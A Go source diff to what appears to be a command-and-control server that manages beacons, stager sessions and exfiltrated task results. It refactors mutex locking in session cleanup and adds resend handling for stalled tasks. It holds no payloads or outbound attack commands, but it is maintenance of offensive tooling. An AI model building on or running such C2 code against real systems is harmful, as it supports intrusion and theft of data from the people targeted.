@@ -442,10 +442,10 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 	defer ticker.Stop()
 
 	for range ticker.C {
-		c2.mutex.Lock()
 		now := time.Now()
 
 		// Clean up old message hashes (keep only last 5 minutes)
+		c2.mutex.Lock()
 		expiredCount := 0
 		for msgHash, timestamp := range c2.recentMessages {
 			if now.Sub(timestamp) > 5*time.Minute {
@@ -453,20 +453,24 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 				expiredCount++
 			}
 		}
+		c2.mutex.Unlock()
 		if c2.debug && expiredCount > 0 {
 			logf("[C2] Cleaned up %d expired message hashes", expiredCount)
 		}
 
 		// Clean up expired stager sessions (collect IPs first to avoid iteration issues)
+		c2.mutex.Lock()
 		var expiredSessionIPs []string
 		for ip, session := range c2.stagerSessions {
 			if now.Sub(session.LastActivity) > StagerSessionTimeout {
 				expiredSessionIPs = append(expiredSessionIPs, ip)
 			}
 		}
+		c2.mutex.Unlock()
 
-		// Now safely stop progress updaters and delete sessions
+		// Now safely stop progress updaters and delete sessions (outside lock)
 		for _, ip := range expiredSessionIPs {
+			c2.mutex.Lock()
 			if session, exists := c2.stagerSessions[ip]; exists {
 				c2.stopProgressUpdater(session)
 				delete(c2.stagerSessions, ip)
@@ -474,9 +478,21 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 					logf("[C2] Cleaned up expired stager session for %s (inactive for %v)", ip, now.Sub(session.LastActivity))
 				}
 			}
+			c2.mutex.Unlock()
 		}
 
 		// Clean up expired expected results, but save partial results first
+		// Collect expired results first (with lock)
+		type expiredResult struct {
+			taskID      string
+			beaconID    string
+			data        []string
+			recvCount   int
+			totalChunks int
+		}
+		var expiredResults []expiredResult
+
+		c2.mutex.Lock()
 		for taskID, expected := range c2.expectedResults {
 			if now.Sub(expected.ReceivedAt) > ExpectedResultTimeout {
 				// Count received chunks
@@ -487,30 +503,15 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 					}
 				}
 
-				// If we have partial data, save it before cleanup
-				if receivedCount > 0 && c2.db != nil {
-					partialResult := strings.Join(expected.ReceivedData, "")
-					logf("[C2] Task %s timed out with %d/%d chunks - saving partial result (%d bytes)",
-						taskID, receivedCount, expected.TotalChunks, len(partialResult))
-
-					// Update task status and save partial result
-					if task, exists := c2.tasks[taskID]; exists {
-						task.Result = partialResult
-						task.Status = "partial"
-
-						// Save to database asynchronously
-						go func(tid, bid, res string, recv, total int) {
-							if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
-								logf("[C2] Failed to save partial result: %v", err)
-							}
-							// Mark as partial in database
-							if err := c2.db.UpdateTaskStatus(tid, "partial"); err != nil && c2.debug {
-								logf("[C2] Failed to update task status: %v", err)
-							}
-						}(taskID, expected.BeaconID, partialResult, receivedCount, expected.TotalChunks)
-					}
-				} else if c2.debug {
-					logf("[C2] Cleaned up expired expected result for task %s (no data received)", taskID)
+				// Collect data for processing outside lock
+				if receivedCount > 0 {
+					expiredResults = append(expiredResults, expiredResult{
+						taskID:      taskID,
+						beaconID:    expected.BeaconID,
+						data:        expected.ReceivedData,
+						recvCount:   receivedCount,
+						totalChunks: expected.TotalChunks,
+					})
 				}
 
 				delete(c2.expectedResults, taskID)
@@ -523,8 +524,35 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 				delete(c2.recentMessages, msgHash)
 			}
 		}
-
 		c2.mutex.Unlock()
+
+		// Process expired results outside the lock
+		for _, expired := range expiredResults {
+			partialResult := strings.Join(expired.data, "")
+			logf("[C2] Task %s timed out with %d/%d chunks - saving partial result (%d bytes)",
+				expired.taskID, expired.recvCount, expired.totalChunks, len(partialResult))
+
+			// Update task status and save partial result
+			c2.mutex.Lock()
+			if task, exists := c2.tasks[expired.taskID]; exists {
+				task.Result = partialResult
+				task.Status = "partial"
+			}
+			c2.mutex.Unlock()
+
+			// Save to database asynchronously (outside lock)
+			if c2.db != nil {
+				go func(tid, bid, res string) {
+					if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
+						logf("[C2] Failed to save partial result: %v", err)
+					}
+					// Mark as partial in database
+					if err := c2.db.UpdateTaskStatus(tid, "partial"); err != nil && c2.debug {
+						logf("[C2] Failed to update task status: %v", err)
+					}
+				}(expired.taskID, expired.beaconID, partialResult)
+			}
+		}
 	}
 }
 
@@ -1092,15 +1120,36 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 				}
 				c2.mutex.Unlock()
 				return "ACK" // No task to deliver
-			} else if storedTask.Status == "sent" || storedTask.Status == "exfiltrating" {
-				// Task already sent or being exfiltrated - remove from queue and don't re-send
+			} else if storedTask.Status == "sent" {
+				// Task already sent - check if it's been too long (>2 min) and might need resend
+				if storedTask.SentAt != nil && time.Since(*storedTask.SentAt) < 2*time.Minute {
+					// Recently sent, don't re-send yet
+					beacon.TaskQueue = beacon.TaskQueue[1:]
+					if c2.debug {
+						logf("[DEBUG] Skipping recently-sent task %s (sent %v ago) from queue for beacon %s",
+							task.ID, time.Since(*storedTask.SentAt), beaconID)
+					}
+					c2.mutex.Unlock()
+					return "ACK"
+				}
+				// Old sent task, allow re-send (might have been lost)
+			} else if storedTask.Status == "exfiltrating" {
+				// Task being exfiltrated - remove from queue and don't re-send
 				beacon.TaskQueue = beacon.TaskQueue[1:]
 				if c2.debug {
-					logf("[DEBUG] Skipping already-executing task %s (status: %s) from queue for beacon %s", task.ID, storedTask.Status, beaconID)
+					logf("[DEBUG] Skipping exfiltrating task %s from queue for beacon %s", task.ID, beaconID)
 				}
 				c2.mutex.Unlock()
 				return "ACK" // No task to deliver
 			}
+		} else {
+			// Task doesn't exist in c2.tasks map - invalid, remove from queue
+			beacon.TaskQueue = beacon.TaskQueue[1:]
+			if c2.debug {
+				logf("[DEBUG] Removing invalid task %s (not in tasks map) from queue for beacon %s", task.ID, beaconID)
+			}
+			c2.mutex.Unlock()
+			return "ACK"
 		}
 
 		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove from queue
